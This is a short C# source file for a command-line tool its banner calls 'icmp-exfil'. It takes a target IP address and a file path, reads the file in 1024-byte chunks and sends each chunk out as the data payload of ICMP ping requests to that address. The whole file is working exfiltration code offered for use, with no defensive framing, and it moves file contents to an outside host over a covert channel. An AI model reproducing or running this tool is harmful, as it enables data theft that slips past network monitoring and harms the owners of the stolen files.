using System;
using System.IO;
using System.Net.NetworkInformation;

class Program
{
    static void Main(string[] args)
    {
        if (args.Length < 4 || args[0] != "-i" || args[2] != "-f")
        {
            Console.WriteLine("[>] Developed by H0ru, check more on https://github.com/h0ru/icmp-quickhacks\r\nUse: icmp-exfil -i <IP Address> -f <File Path> ");
            return;
        }

        string ip = args[1];
        string filePath = args[3];

        if (!File.Exists(filePath))
        {
            Console.WriteLine("[!] The input file '" + filePath + "' does not exist.");
            return;
        }

        Ping ping = new Ping();

        using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read))
        {
            byte[] buffer = new byte[1024];
            int bytesRead;

            while ((bytesRead = fs.Read(buffer, 0, buffer.Length)) > 0)
            {
                try
                {
                    PingReply reply = ping.Send(ip, 1000, buffer, new PingOptions());

                    if (reply.Status != IPStatus.Success)
                    {
                        Console.WriteLine("[!] Failed to ping to IP address: " + ip + ". Status: " + reply.Status);
                        return;
                    }
                }
                catch (PingException ex)
                {
                    Console.WriteLine("[!] Error sending ping: " + ex.Message);
                    return;
                }
            }
        }

        Console.WriteLine("[+] Ping completed to " + ip + " from file " + filePath);
    }
}
